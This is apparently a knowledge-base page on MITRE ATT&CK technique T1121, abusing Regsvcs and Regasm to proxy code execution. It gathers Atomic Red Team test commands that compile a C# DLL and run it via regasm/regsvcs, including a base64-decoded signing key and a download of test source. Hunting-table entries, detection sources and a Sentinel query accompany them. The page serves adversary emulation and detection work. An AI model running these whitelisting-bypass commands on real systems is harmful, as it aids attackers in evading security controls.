
# Regsvcs/Regasm

## Description

### MITRE Description

> Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Process whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1121

## Potential Commands

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"%tmp%\T1121.dll" /target:library #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U %tmp%\T1121.dll

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library PathToAtomicsFolder\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}

$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"$Env:TEMP\T1121.dll" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $Env:TEMP\T1121.dll

$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk PathToAtomicsFolder\T1121\src\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}

regsvcs.exe *.dll
regasm.exe *.dll
rundll32.exe *.dll.entrypoint
```

## Commands Dataset

```
[{'command': 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
             '/r:System.EnterpriseServices.dll /out:"%tmp%\\T1121.dll" '
             '/target:library #{source_file}\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U '
             '%tmp%\\T1121.dll\n',
  'name': None,
  'source': 'atomics/T1121/T1121.yaml'},
 {'command': 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
             '/r:System.EnterpriseServices.dll /out:"#{output_file}" '
             '/target:library PathToAtomicsFolder\\T1121\\src\\T1121.cs\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U '
             '#{output_file}\n',
  'name': None,
  'source': 'atomics/T1121/T1121.yaml'},
 {'command': '$key = '
             "'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n"
             '$Content = [System.Convert]::FromBase64String($key)\n'
             'Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
             '/r:System.EnterpriseServices.dll /out:"$Env:TEMP\\T1121.dll" '
             '/target:library /keyfile:$env:Temp\\key.snk #{source_file}\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe '
             '$Env:TEMP\\T1121.dll\n',
  'name': None,
  'source': 'atomics/T1121/T1121.yaml'},
 {'command': '$key = '
             "'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n"
             '$Content = [System.Convert]::FromBase64String($key)\n'
             'Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
             '/r:System.EnterpriseServices.dll /out:"#{output_file}" '
             '/target:library /keyfile:$env:Temp\\key.snk '
             'PathToAtomicsFolder\\T1121\\src\\T1121.cs\n'
             'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe '
             '#{output_file}\n',
  'name': None,
  'source': 'atomics/T1121/T1121.yaml'},
 {'command': 'regsvcs.exe *.dll',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'regasm.exe *.dll',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'rundll32.exe *.dll.entrypoint',
  'name': None,
  'source': 'Threat Hunting Tables'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['ID 1 & 7', 'Sysmon']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']}]
```

## Potential Queries

```json
[{'name': 'Regsvcs Regasm',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3and (process_path contains '
           '"regsvcs.exe"or process_path contains "regasm.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - RegSvcs/RegAsm': {'atomic_tests': [{'auto_generated_guid': '71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112',
                                                              'dependencies': [{'description': 'The '
                                                                                               'CSharp '
                                                                                               'source '
                                                                                               'file '
                                                                                               'must '
                                                                                               'exist '
                                                                                               'on '
                                                                                               'disk '
                                                                                               'at '
                                                                                               'specified '
                                                                                               'location '
                                                                                               '(#{source_file})\n',
                                                                                'get_prereq_command': 'New-Item '
                                                                                                      '-Type '
                                                                                                      'Directory '
                                                                                                      '(split-path '
                                                                                                      '#{source_file}) '
                                                                                                      '-ErrorAction '
                                                                                                      'ignore '
                                                                                                      '| '
                                                                                                      'Out-Null\n'
                                                                                                      'Invoke-WebRequest '
                                                                                                      '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" '
                                                                                                      '-OutFile '
                                                                                                      '"#{source_file}"\n',
                                                                                'prereq_command': 'if '
                                                                                                  '(Test-Path '
                                                                                                  '#{source_file}) '
                                                                                                  '{exit '
                                                                                                  '0} '
                                                                                                  'else '
                                                                                                  '{exit '
                                                                                                  '1}\n'}],
                                                              'dependency_executor_name': 'powershell',
                                                              'description': 'Executes '
                                                                             'the '
                                                                             'Uninstall '
                                                                             'Method, '
                                                                             'No '
                                                                             'Admin '
                                                                             'Rights '
                                                                             'Required. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             '"I '
                                                                             "shouldn't "
                                                                             'really '
                                                                             'execute '
                                                                             'either." '
                                                                             'will '
                                                                             'be '
                                                                             'displayed.\n',
                                                              'executor': {'cleanup_command': 'del '
                                                                                              '#{output_file} '
                                                                                              '>nul '
                                                                                              '2>&1\n',
                                                                           'command': 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
                                                                                      '/r:System.EnterpriseServices.dll '
                                                                                      '/out:"#{output_file}" '
                                                                                      '/target:library '
                                                                                      '#{source_file}\n'
                                                                                      'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe '
                                                                                      '/U '
                                                                                      '#{output_file}\n',
                                                                           'elevation_required': False,
                                                                           'name': 'command_prompt'},
                                                              'input_arguments': {'output_file': {'default': '%tmp%\\T1121.dll',
                                                                                                  'description': 'Location '
                                                                                                                 'of '
                                                                                                                 'the '
                                                                                                                 'payload',
                                                                                                  'type': 'Path'},
                                                                                  'source_file': {'default': 'PathToAtomicsFolder\\T1121\\src\\T1121.cs',
                                                                                                  'description': 'Location '
                                                                                                                 'of '
                                                                                                                 'the '
                                                                                                                 'CSharp '
                                                                                                                 'source_file',
                                                                                                  'type': 'Path'}},
                                                              'name': 'Regasm '
                                                                      'Uninstall '
                                                                      'Method '
                                                                      'Call '
                                                                      'Test',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': 'fd3c1c6a-02d2-4b72-82d9-71c527abb126',
                                                              'dependencies': [{'description': 'The '
                                                                                               'CSharp '
                                                                                               'source '
                                                                                               'file '
                                                                                               'must '
                                                                                               'exist '
                                                                                               'on '
                                                                                               'disk '
                                                                                               'at '
                                                                                               'specified '
                                                                                               'location '
                                                                                               '(#{source_file})\n',
                                                                                'get_prereq_command': 'New-Item '
                                                                                                      '-Type '
                                                                                                      'Directory '
                                                                                                      '(split-path '
                                                                                                      '#{source_file}) '
                                                                                                      '-ErrorAction '
                                                                                                      'ignore '
                                                                                                      '| '
                                                                                                      'Out-Null\n'
                                                                                                      'Invoke-WebRequest '
                                                                                                      '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" '
                                                                                                      '-OutFile '
                                                                                                      '"#{source_file}"\n',
                                                                                'prereq_command': 'if '
                                                                                                  '(Test-Path '
                                                                                                  '#{source_file}) '
                                                                                                  '{exit '
                                                                                                  '0} '
                                                                                                  'else '
                                                                                                  '{exit '
                                                                                                  '1}\n'}],
                                                              'dependency_executor_name': 'powershell',
                                                              'description': 'Executes '
                                                                             'the '
                                                                             'Uninstall '
                                                                             'Method, '
                                                                             'No '
                                                                             'Admin '
                                                                             'Rights '
                                                                             'Required, '
                                                                             'Requires '
                                                                             'SNK. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             '"I '
                                                                             "shouldn't "
                                                                             'really '
                                                                             'execute" '
                                                                             'will '
                                                                             'be '
                                                                             'displayed\n'
                                                                             'along '
                                                                             'with '
                                                                             'other '
                                                                             'information '
                                                                             'about '
                                                                             'the '
                                                                             'assembly '
                                                                             'being '
                                                                             'installed.\n',
                                                              'executor': {'cleanup_command': 'Remove-Item '
                                                                                              '#{output_file} '
                                                                                              '-ErrorAction '
                                                                                              'Ignore '
                                                                                              '| '
                                                                                              'Out-Null\n'
                                                                                              '$parentpath '
                                                                                              '= '
                                                                                              'Split-Path '
                                                                                              '-Path '
                                                                                              '"#{output_file}"\n'
                                                                                              'Remove-Item '
                                                                                              '$parentpath\\key.snk '
                                                                                              '-ErrorAction '
                                                                                              'Ignore '
                                                                                              '| '
                                                                                              'Out-Null\n'
                                                                                              'Remove-Item '
                                                                                              '$parentpath\\T1121.tlb '
                                                                                              '-ErrorAction '
                                                                                              'Ignore '
                                                                                              '| '
                                                                                              'Out-Null\n',
                                                                           'command': '$key '
                                                                                      '= '
                                                                                      "'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n"
                                                                                      '$Content '
                                                                                      '= '
                                                                                      '[System.Convert]::FromBase64String($key)\n'
                                                                                      'Set-Content '
                                                                                      '$env:Temp\\key.snk '
                                                                                      '-Value '
                                                                                      '$Content '
                                                                                      '-Encoding '
                                                                                      'Byte\n'
                                                                                      'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe '
                                                                                      '/r:System.EnterpriseServices.dll '
                                                                                      '/out:"#{output_file}" '
                                                                                      '/target:library '
                                                                                      '/keyfile:$env:Temp\\key.snk '
                                                                                      '#{source_file}\n'
                                                                                      'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe '
                                                                                      '#{output_file}\n',
                                                                           'elevation_required': True,
                                                                           'name': 'powershell'},
                                                              'input_arguments': {'output_file': {'default': '$Env:TEMP\\T1121.dll',
                                                                                                  'description': 'Location '
                                                                                                                 'of '
                                                                                                                 'the '
                                                                                                                 'payload',
                                                                                                  'type': 'Path'},
                                                                                  'source_file': {'default': 'PathToAtomicsFolder\\T1121\\src\\T1121.cs',
                                                                                                  'description': 'Location '
                                                                                                                 'of '
                                                                                                                 'the '
                                                                                                                 'CSharp '
                                                                                                                 'source_file',
                                                                                                  'type': 'Path'}},
                                                              'name': 'Regsvs '
                                                                      'Uninstall '
                                                                      'Method '
                                                                      'Call '
                                                                      'Test',
                                                              'supported_platforms': ['windows']}],
                                            'attack_technique': 'T1121',
                                            'display_name': 'RegSvcs/RegAsm'}},
 {'Threat Hunting Tables': {'chain_id': '100168',
                            'commandline_string': '*.dll',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1121',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'regsvcs.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100169',
                            'commandline_string': '*.dll',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1121',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'regasm.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100170',
                            'commandline_string': '*.dll.entrypoint',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1121',
                            'mitre_caption': 'execution',
                            'os': 'windows',
                            'parent_process': 'rundll32.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors

None
